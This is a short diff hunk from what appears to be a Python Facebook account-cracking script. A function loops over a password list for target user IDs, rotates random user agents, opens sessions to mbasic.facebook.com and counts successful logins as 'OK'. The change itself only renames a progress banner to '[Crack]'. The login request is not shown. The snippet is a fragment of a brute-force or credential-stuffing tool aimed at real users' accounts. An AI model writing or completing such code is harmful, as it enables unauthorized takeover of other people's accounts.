@@ -231,7 +231,7 @@ def jubair(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r\033[1;32m[SHAMIM]\033[1;36m👑?[%s/%s]💋\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
+            sys.stdout.write('\r\033[1;32m[Crack]\033[1;36m👑?[%s/%s]💋\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
